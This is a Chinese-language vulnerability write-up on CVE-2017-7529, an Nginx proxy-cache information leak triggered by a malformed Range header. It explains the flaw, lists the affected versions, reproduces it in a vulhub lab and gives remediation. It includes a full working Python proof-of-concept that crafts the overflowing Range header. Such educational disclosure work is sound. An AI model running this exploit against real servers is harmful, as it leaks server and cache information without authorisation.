## 1、Nginx反向代理

正向代理：代理服务器位于客户机与服务器之间；当客户机想访问服务器主机时，需要先设置代理，然后请求被发送到代理服务器，由代理服务器转发给服务器主机，服务器主机再把请求结果通过代理给予客户机。

反向代理：代理服务器位于服务端，客户机不需要设置代理，它会将客户机的请求交给内部网络上的目标服务器，目标服务器处理结果后再由它发送给客户机，此时代理与目标服务器表现为一个整体

Nginx反向代理服务器：安装于服务端，转发客户端请求给目标服务器，后台如果有多台http服务器提供服务，由它决定当前请求交给哪台服务器去处理。

简单的反向代理配置如下：

    
    
    server {
        listen       8081;
        server_name  localhost;
    
        charset utf-8;
    
        location / {
            root   /usr/share/nginx/html;
            index  index.html;
        }
    }
    server {
        listen       8080;
        server_name  localhost;
    
        charset utf-8;
    
        location / {
            proxy_pass http://127.0.0.1:8081/;
            proxy_set_header HOST $host;
            proxy_cache cache_zone;
            add_header X-Proxy-Cache $upstream_cache_status;
            proxy_ignore_headers Set-Cookie;
        }
    

## 2、漏洞原理

Nginx在进行反向代理时，如果开启了代理缓存，通常会将服务器端的一些文件进行缓存，特别是静态文件。

每个缓存文件包括：文件头+HTTP包头+HTTP返回包体

当用户再次请求该文件时，Nginx会直接从该缓存文件中取出 **HTTP返回包体** 给用户

但是如果攻击者在请求中构造恶意的range头，就会导致缓存文件的 **文件头+HTTP包头** 部分也被作为结果返回，导致服务器端的信息被泄露

HTTP的range头可以指定start和end的值，然后返回请求文件指定大小的内容。对于一般文件而言，range域无论怎样设置都不会有什么问题，但是对于缓存文件而言，它还包含了额外的头部信息(服务端信息)，因此如果start值被设置为负值时就有可能读取到缓存文件的头部。

## 3、影响版本

0.5.6 - 1.13.2

## 4、漏洞复现

进入/vulhub/nginx/CVE-2017-7529，启动靶场：docker-compose up -d

浏览器访问http://ip:8080

使用靶场自带的POC读取缓存文件：python3 poc.py http://ip:8080

    
    
    #poc源码
    
    #!/usr/bin/env python
    import sys
    import requests
    
    if len(sys.argv) < 2:
        print("%s url" % (sys.argv[0]))
        print("eg: python %s http://your-ip:8080/" % (sys.argv[0]))
        sys.exit()
    
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
    }
    #偏移值，以HTTP返回包体处为起点(相当于0)
    offset = 605 
    url = sys.argv[1]
    #获取HTTP返回包体的长度
    file_len = len(requests.get(url, headers=headers).content)
    n = file_len + offset
    #网上他人的源码分析来看需要将Range设置为：Range: bytes=-X,-Y;X的值可设的比HTTP返回包体长度大一些，且要小于Y的值
    headers['Range'] = "bytes=-%d,-%d" % (
        n, 0x8000000000000000 - n)
    r = requests.get(url, headers=headers)
    print(r.text)
    

可以成功访问到缓存文件，得到头部信息  
![图片.png](https://image.3001.net/images/20210817/1629170400_611b2ae086da5f0afbefa.png!small)

## 5、漏洞修复

升级Nginx，打补丁

关闭Nginx代理缓存

